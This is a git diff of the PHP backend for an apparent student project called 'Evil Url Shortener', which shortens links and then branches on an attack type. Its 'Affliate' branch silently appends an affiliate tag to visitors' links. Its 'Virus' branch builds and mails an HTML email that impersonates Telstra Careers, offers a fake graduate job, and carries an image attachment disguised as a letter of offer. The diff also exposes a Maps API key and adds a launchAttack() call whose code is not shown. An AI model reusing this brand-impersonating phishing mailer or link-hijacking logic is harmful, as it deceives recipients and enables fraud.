@@ -1,7 +1,7 @@
 <?php
 session_start();
-require "../php/DataBaseHandling.php";
-require "../scripts/simple_html_dom.php" ;
+require_once "../php/DataBaseHandling.php";
+require_once "../php/SelectedController.php";
 
 $key = "";
 $conn = openConnection();
@@ -13,18 +13,18 @@ $useraddress = $_POST["useremail"];
 $_SESSION['urllink']=$longlink;
 $_SESSION['Type']=$typeOfAttack;
 
+//creating file and folder in server 
 function createFolderAndFile($key){
   if (!is_dir($key)) {
     $full = getcwd();
     $path = substr($full , 0 , strlen($full) - strlen(strrchr($full , "/")));
     mkdir($path."/"."$key" , 0777 , true);
-    $myfile = fopen("../$key/get.php", "w") or die("Unable to open file!");
-    $myfileToRead = fopen("../php/SelectedController.php", "r") or die("Unable to open file!");
-    $txt = fread($myfileToRead,filesize("../php/SelectedController.php"));
-    fclose($myfileToRead);
-
-    fwrite($myfile, $txt);
-    fclose($myfile);
+ //   $myfile = fopen("../$key/index.html", "w") or die("Unable to open file!");
+//    $myfileToRead = fopen("../php/SelectedController.php", "r") or die("Unable to open file!");
+//    $txt = fread($myfileToRead,filesize("../php/SelectedController.php"));
+//    fclose($myfileToRead);
+//    fwrite($myfile, $txt);
+//    fclose($myfile);
   }
 }
 
@@ -68,64 +68,33 @@ function createFolderAndFile($key){
 //
 //}
 
+$key = generateKey(6,$key);
+$key = checkForDuplicateKeys($key , $conn);
+createFolderAndFile($key);
+$userlink = "http://stme.esy.es/".$key;
 
-
-if($typeOfAttack == "Password"){
+//Selecting which data to store according to different attacks
+if($typeOfAttack == "Password" || $typeOfAttack == "Dos"){
    $illlonglink = $_POST['illurlink'];
   $_SESSION['illlonglink'] = $illlonglink;
-  $key = generateKey(6,$key);
-  $key = checkForDuplicateKeys($key , $conn);
   addDataToDatabase($key , $longlink , $conn);
   addDataToDatabase($key , $illlonglink , $conn);
-  createFolderAndFile($key);
-  $userlink = "http://stme.esy.es/".$key."/get.php";
  }
-else if($typeOfAttack == "Dos"){
-   $illlonglink = $_POST['illurlink'];
-  $_SESSION['illlonglink'] = $illlonglink;
-  $key = generateKey(6,$key);
-  $key = checkForDuplicateKeys($key , $conn);
-  addDataToDatabase($key , $longlink , $conn);
-  addDataToDatabase($key , $illlonglink , $conn);
-  createFolderAndFile($key);
-  $userlink = "http://stme.esy.es/".$key."/get.php";
- }
-
-//else if($typeOfAttack ==="Tracking"){
-    // $map =    "<div id='map' class='form-control' style='height:500px'></div>";
-    //
-    // $html = file_get_html("http://kclproject.esy.es/shorten/");
-    // $element = $html->find('div[class=urlform]',0);
-    //
-    // $element->innertext =  $element->innertext.$map;
-    //
-    // $html->save("http://kclproject.esy.es/shorten/");
-
-//}
 else if($typeOfAttack == "Affliate"){
      $textToInsert = "&tag=socialexperim-20";
      $newLongLink = $longlink.$textToInsert; 
      $key = checkForDuplicateLinks($longlink,$conn);
-  if(is_null($key)===TRUE){
-    $key = generateKey(6,$key);
-    $key = checkForDuplicateKeys($key , $conn);
-    addDataToDatabase($key , $newLongLink , $conn);
-    $userlink = "http://stme.esy.es/".$key."/get.php";
-    createFolderAndFile($key);
-
-  }
+     if(is_null($key)===TRUE){
+        addDataToDatabase($key , $newLongLink , $conn);
+     }
 }
 else if($typeOfAttack == "Virus"){
-     $key = generateKey(6,$key);
-  $key = checkForDuplicateKeys($key , $conn);
-  addDataToDatabase($key , $longlink , $conn);
-    createFolderAndFile($key);
-
+    addDataToDatabase($key , $longlink , $conn);
   // More headers
-   $fileatt = "../imgs/telstralogo.png"; // Path to the file
-$fileatt_type = "image/png"; // File Type
-$fileatt_name = "TelstraGraduateLetterOfOffer.png"; // Filename that will be used for the file as the attachment
-  $message .= '<html><body>';
+    $fileatt = "../imgs/telstralogo.png"; // Path to the file
+    $fileatt_type = "image/png"; // File Type
+    $fileatt_name = "TelstraGraduateLetterOfOffer.png"; // Filename that will be used for the file as the attachment
+    $message .= '<html><body>';
     $message .= '<img src="http://stme.esy.es/imgs/telstralogo.png">';
     $message .= '<p><br/>Dear Applicant</b></p>'; 
     $message .= '<p><br/>We are very pleased to offer you the position of Graduate, on a full time basis, commencing August 31st 2016 as part of Telstra Graduate Program.</b></p>'; 
@@ -141,7 +110,7 @@ $fileatt_name = "TelstraGraduateLetterOfOffer.png"; // Filename that will be use
     $message .= '</body></html>';
     $subject = 'Graduate Letter of Offer';
     
-$headers = "From: ". "TelstraCareers@no-reply.com";
+    $headers = "From: ". "TelstraCareers@no-reply.com";
     $file = fopen($fileatt,'rb');
     $data = fread($file,filesize($fileatt));
     fclose($file);
@@ -149,74 +118,100 @@ $headers = "From: ". "TelstraCareers@no-reply.com";
     $semi_rand = md5(time());
     $mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
     $headers .= "\nMIME-Version: 1.0\n" .
-"Content-Type: multipart/mixed;\n" .
-" boundary=\"{$mime_boundary}\"";
+    "Content-Type: multipart/mixed;\n" .
+    " boundary=\"{$mime_boundary}\"";
 
-$message .= "This is a multi-part message in MIME format.\n\n" .
-"--{$mime_boundary}\n" .
-"Content-Type:text/html; charset=\"iso-8859-1\"\n" .
-"Content-Transfer-Encoding: 7bit\n\n" .
-$message .= "\n\n";
+    $message .= "This is a multi-part message in MIME format.\n\n" .
+    "--{$mime_boundary}\n" .
+    "Content-Type:text/html; charset=\"iso-8859-1\"\n" .
+    "Content-Transfer-Encoding: 7bit\n\n" .
+    $message .= "\n\n";
 
-$data = chunk_split(base64_encode($data));
+    $data = chunk_split(base64_encode($data));
 
-$message .= "--{$mime_boundary}\n" .
-"Content-Type: {$fileatt_type};\n" .
-" name=\"{$fileatt_name}\"\n" .
-//"Content-Disposition: attachment;\n" .
-//" filename=\"{$fileatt_name}\"\n" .
-"Content-Transfer-Encoding: base64\n\n" .
-$data .= "\n\n" ."--{$mime_boundary}--\n";
-    
-mail($address,$subject,$message,$headers);
-    
-    $userlink = "http://stme.esy.es/".$key."/get.php";
-    
+    $message .= "--{$mime_boundary}\n" .
+    "Content-Type: {$fileatt_type};\n" .
+    " name=\"{$fileatt_name}\"\n" .
+    "Content-Transfer-Encoding: base64\n\n" .
+    $data .= "\n\n" ."--{$mime_boundary}--\n";
+    mail($address,$subject,$message,$headers);    
 }
 else{
-    $key = generateKey(6,$key);
-    $key = checkForDuplicateKeys($key , $conn);
-    addDataToDatabase($key , $longlink , $conn);
-    if(il)
-    $userlink = "http://stme.esy.es/".$key."/get.php";
-    createFolderAndFile($key);
+    addDataToDatabase($key , $longlink , $conn); 
   }
-$conn->close(); ?>
+
+
+?>
 
 
 <!DOCTYPE HTML>
 <html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>FinalYearProject</title>
-  <link href="../css/bootstrap.min.css" rel="stylesheet">
-  <link href="../css/main.css" rel="stylesheet">
-  <script src="http://maps.googleapis.com/maps/api/js?key=AIzaSyB10_ZYaNx56uCzjseUi8OmeaQj1GH7q4c"></script>
-  <script src="../js/jquery-1.11.2.js" type="text/javascript"></script>
-  <script src ="../js/mainscript" type="text/javascript"></script>
-  <script src = "../js/ui.js" type="text/javascript"></script>
+    <head>
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <title>FinalYearProject</title>
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+      <link rel="stylesheet" type="text/css" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">
+      <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.6.2/css/bootstrap-select.min.css" />
+      <script src="//cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.6.2/js/bootstrap-select.min.js"></script>
+      <script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
+      <link href="../css/main.css" rel="stylesheet">
+      <script src = "../js/ui.js" type="text/javascript"></script>
+    </head>
+    <body>
+        <!--setting up navigation bar-->
+        <nav class="navbar navbar-default navbar-fixed-top">
+            <div class="container">
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+                        <span class="sr-only">Toggle Navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="#">Evil Url Shortener</a>
+                </div>
+                <div id="navbar" class="navbar-collapse collapse" aria-expanded="false"style="height: 1px;">
+                    <ul class="nav navbar-nav">
+                        <li class="active">
+                            <a href="http://stme.esy.es">Home</a>
+                        </li>
+                        <li>
+                            <a href="http://stme.esy.es/map.html">Map</a>
+                        </li>
+                        <li>
+                            <a href="http://stme.esy.es/analytics.html">Analytics</a>
+                        </li>
+                        <li>
+                            <a href="http://stme.esy.es/news.html">News</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <!--setting up form-->
+        <div class = "urlform" >
+            <h1> Thanks For Using :) </h1>
+            <button type="button" class="btn btn-success" style="float:right" id="go" onclick="">Go</button>
+            <div style="overflow: hidden; padding-right: .5em;">
+                <input type="url" class="form-control" name="urllink" id="form" value="<?php echo $userlink ?>"/>
+            </div>
+        </div>
+      <!--setting up video background-->
+      <div class ="videobackground">
+        <video autoplay loop width="100%" class="bgvid">
+          <source src="../Productive-Morning/MP4/Productive-Morning.mp4" type="video/mp4" />Your browser does not support the video tag. I suggest you upgrade your browser.
+          <source src="../Productive-Morning/WEBM/Productive-Morning.webm" type="video/webm" />Your browser does not support the video tag. I suggest you upgrade your browser.
+        </video>
+        <div class="poster hidden">
+          <img src="../Productive-Morning/snapshots/Productive-Morning.jpg" alt="">
+        </div>
+      </div>
 
-</head>
-<body>
-  <div class = "urlform" >
-    <h1> Thanks For Using :) </h1>
-    <button type="button" class="btn btn-success" style="float:right" id="go">Go</button>
-    <div style="overflow: hidden; padding-right: .5em;">
-        <input type="url" class="form-control" name="urllink" id="form" value="<?php echo $userlink ?>"/>
-    </div>
-
-  </div>
-  <div class ="videobackground">
-    <video autoplay loop width="100%" class="bgvid">
-      <source src="../Productive-Morning/MP4/Productive-Morning.mp4" type="video/mp4" />Your browser does not support the video tag. I suggest you upgrade your browser.
-      <source src="../Productive-Morning/WEBM/Productive-Morning.webm" type="video/webm" />Your browser does not support the video tag. I suggest you upgrade your browser.
-    </video>
-    <div class="poster hidden">
-      <img src="../Productive-Morning/snapshots/Productive-Morning.jpg" alt="">
-    </div>
-  </div>
-
-</body>
+    </body>
 </html>
+<?php 
+launchAttack($typeOfAttack,$conn,$key);
+$conn->close(); 
+?> 
